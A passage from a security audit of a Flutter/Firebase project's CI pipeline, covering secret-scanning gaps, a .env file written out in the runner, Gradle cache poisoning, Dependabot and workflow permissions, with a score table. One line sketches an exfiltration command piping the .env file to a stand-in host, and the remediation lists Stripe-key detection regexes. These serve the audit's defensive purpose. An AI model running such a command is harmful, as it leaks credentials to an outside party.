The TruffleHog scan at `build-validation.yml:88` runs `--only-verified` meaning it only flags **live, verifiable** secrets — for a fresh leak that's still valid, this catches Stripe/Mistral. But the local pre-commit gate doesn't, so the secret CAN get into git history and trigger only at CI push time (after which `git push --force` rewriting becomes the rotation cost).

**Severity:** HIGH — Pass 2 promotes from MED. Stripe is on the monetization roadmap (per MEMORY.md decisions); a Stripe key leaked via local commit + immediate push is a financial liability.

**Remediation:**
1. Extend lefthook regex to include `sk_live_[a-zA-Z0-9]{24}` and `pk_live_[a-zA-Z0-9]{24}`. 1 minute.
2. Add Slack webhook pattern. 1 minute.
3. Run TruffleHog locally as a slower secondary check (`pre-push` not `pre-commit`). 30 minutes.

#### MED-INFRA-13 (NEW, Pass 2) — `.env` file with 17 secrets materialized in CI runner workspace

**Evidence:** `build-validation.yml:121-144` writes a `.env` file containing 17 distinct secrets via `cat > .env << 'ENVEOF'`. The file persists for all subsequent build steps (Android, iOS, web). A compromised step (e.g., a malicious version of any third-party action — see HIGH-INFRA-10) could `cat .env | curl exfiltration-host`. The `.env` file is not deleted at job end (`.env` is typical in `.gitignore` but the runner is ephemeral, so this is moot from a persistence standpoint — the risk is in-runner exfiltration).

**Mitigation:** Use `--dart-define` flags directly from `${{ secrets.* }}` instead of materializing `.env`. Flutter supports `--dart-define-from-file` from a file OR direct CLI flags. Direct flags don't materialize on disk and aren't visible to other actions in the workflow.

**Severity:** MEDIUM — risk is contingent on action compromise (HIGH-INFRA-10 fix removes most of this).

#### MED-INFRA-14 (NEW, Pass 2) — `actions/cache@v5` Gradle key is `hashFiles('**/*.gradle*', '**/gradle-wrapper.properties')` — fork-PR cache poisoning vector

**Evidence:** `build-validation.yml:181-186`. The cache key globs `**/*.gradle*` over the entire workspace. A fork-PR contributor adding a malicious `evil.gradle` file (e.g., as part of a sample or fixture under `test/`) would cause a fresh cache key, and the fork's resolved Gradle artifacts could populate `~/.gradle/caches`. On the next main-branch run, if the cache key happens to collide (unlikely with hashFiles but possible if the malicious file is removed), the poisoned cache could be restored.

GitHub Actions cache is scoped per-repo and per-branch, with main-branch caches accessible by branches. Fork PRs use their own cache scope by default — so the attack requires the malicious gradle file to land on `main` or `develop` first. Lower-severity than HIGH-INFRA-10. Documenting for completeness.

**Severity:** LOW-to-MEDIUM. Real but contingent on bypassing PR review.

**Remediation:** Tighten the glob to `'android/**/*.gradle*'`. 1 minute.

#### M-INFRA-31 (NEW, Pass 2) — Cron schedule asymmetries across workflows

- `dep-audit.yml:16` — `cron: "0 5 * * 1"` (Mon 05:00 UTC)
- `e2e_tests.yml:23` — `cron: '0 2 * * *'` (daily 02:00 UTC)
- `firestore-rules.yml` — no schedule (MED-INFRA-8 already flagged)
- `architecture-validation.yml`, `build-validation.yml`, `test.yml` — no schedule

**Implication:** No nightly trigger for tests, build-validation, or architecture-validation — drift in production code that doesn't touch the path filters won't be caught until the next push. Add a `nightly: cron: '0 3 * * *'` on test.yml at minimum.

#### M-INFRA-32 (NEW, Pass 2) — `compileSdk = 36` and `targetSdk = 36` exceed orchestrator's stated baseline (35)

`android/app/build.gradle.kts:19, :38`. Android API 36 is Android 16 (released 2025-Q3 per Google's roadmap). The team is **ahead** of the orchestrator's August-2025 deadline (SDK 35). Document as a strength: orchestrator says "must be 35 since August 2025" → live is 36. Worth highlighting in synthesis as positive signal.

#### M-INFRA-33 (NEW, Pass 2) — `keystorePropertiesFile` exists check at `build.gradle.kts:13-15` is the only fail-safe; CI build will throw GradleException if `key.properties` missing

`android/app/build.gradle.kts:59-66` — the build EXPLICITLY fails if CI runs without keystore secrets, with a clear error message naming the 4 required GH secrets. **This is exemplary defensive coding** — credit it. Pass 1 didn't call this out. The combination of this fail-loud + the AAB-cert verification at `build-validation.yml:196-213` means signing-config drift is well-defended.

#### M-INFRA-34 (NEW, Pass 2) — `dependabot.yml` ignores all major-version bumps via `version-update:semver-major`

`dependabot.yml:50-53, 109-112, 154-157`. **Across all three ecosystems** (pub, npm, github-actions). Solo-dev acceptable per CLAUDE.md context, but: a CVE that's only patched in a major version bump (e.g., `firebase_core` 4.x → 5.x security fix) would be silently skipped. The OSV scan (`dep-audit.yml:53`) would flag it but no automation tracks the gap. **Add a quarterly manual review process documented in `.github/dependabot.yml` header.**

#### M-INFRA-35 (NEW, Pass 2) — No `permissions:` block on `architecture-validation.yml` job-level — uses default

`architecture-validation.yml:33-36` declares per-job permissions (good) but other workflows don't. `build-validation.yml`, `test.yml`, `e2e_tests.yml` — none declare `permissions:`. The repository default permissions apply (which depend on the org/repo setting; could be read-write or restricted). Best practice: explicit `permissions: contents: read` at the workflow level, with per-job elevation only where needed.

### Reference count (Pass 2 final)

Pass 1 claimed ≥120 unique. Pass 2 added refs for: action pinning sites (10+ refs across all 6 workflow files), dep-audit concurrency-gap, build.gradle.kts:13-15/19/34/38/59-66/70-75, e2e_tests.yml:23 (cron), lefthook.yml:21 (regex), firebase.json (predeploy verification untouched), infrastructure/ dir contents (3 file paths), scripts/pip*.exe (3 paths), test_real_time_baseline.txt (verified 20-line head). **New total: ≥140 unique file:line refs.**

### What Pass 2 deliberately did NOT verify (carrying forward Pass 1 claims)

1. `lib/main.dart:127-250` Crashlytics + Zone setup. Trust Pass 1.
2. `lib/services/monitoring/app_monitoring_service.dart:1-60`. Trust.
3. `firebase.json:1-66` predeploy hooks and CSP. Trust.
4. `functions/src/audit_logs/purge-expired.ts:120` and `functions/src/cleanup/on-user-deleted.ts:30` `.region("europe-west1")` overrides. Trust.
5. The 13 ops runbooks beyond `backups.md`, `data-residency.md`, `gcp-alerting-runbook.md`. Pass 1 sampled 4; Pass 2 sampled the same 4. **Open: prompt 12 should sample the remaining 9 for content-vs-code drift.**
6. `infrastructure/alerting/setup-gcp-alerts.sh` line-by-line. Pass 1 didn't read; Pass 2 confirmed it exists at 6595 bytes. **Open**: read this and reconcile vs the 2-policy claim in the runbook.

### Score reconciliation

| Dimension | Pass 1 | Pass 2 | Δ | Reason |
|---|---:|---:|---:|---|
| Build Pipeline & Automation | 11 | 10 | -1 | dep-audit.yml concurrency-missing, action SHA-pinning gap |
| Testing Strategy & Coverage | 9 | 9 | 0 | unchanged |
| Deployment & Release | 4 | 4 | 0 | unchanged |
| Backup & DR | 9 | 7 | -2 | CRIT-INFRA-1 verified live, not hypothetical |
| Monitoring & Observability | 8 | 7 | -1 | Pass 1 was generous; only 2 alert policies + no SLO doc |
| Development Workflow | 6 | 6 | 0 | unchanged |
| Incident Response | 5 | 5 | 0 | unchanged |
| CI/CD Security | 9 | 8 | -1 | Stripe/Mistral gap promoted, .env materialization risk added |
| **Total** | **61** | **56** | **-5** | |

### Pass-2 confidence assessment

- **High confidence (verified live, file:line):** CRIT-INFRA-1, CRIT-INFRA-2, CRIT-INFRA-3, HIGH-INFRA-3, HIGH-INFRA-4, HIGH-INFRA-9, HIGH-INFRA-10, HIGH-INFRA-11, MED-INFRA-13, MED-INFRA-14, M-INFRA-32, M-INFRA-33.
- **Medium confidence (carried forward from Pass 1, plausible but not re-verified):** HIGH-INFRA-1, HIGH-INFRA-2 (manual deploy claim is structurally hard to disprove), MED-INFRA-1 (alert policy count).
- **Low confidence (open items requiring follow-up):** infrastructure/alerting/setup-gcp-alerts.sh line-by-line, 9 unsampled runbooks, live Firestore region (still requires `gcloud firestore databases describe` to settle).
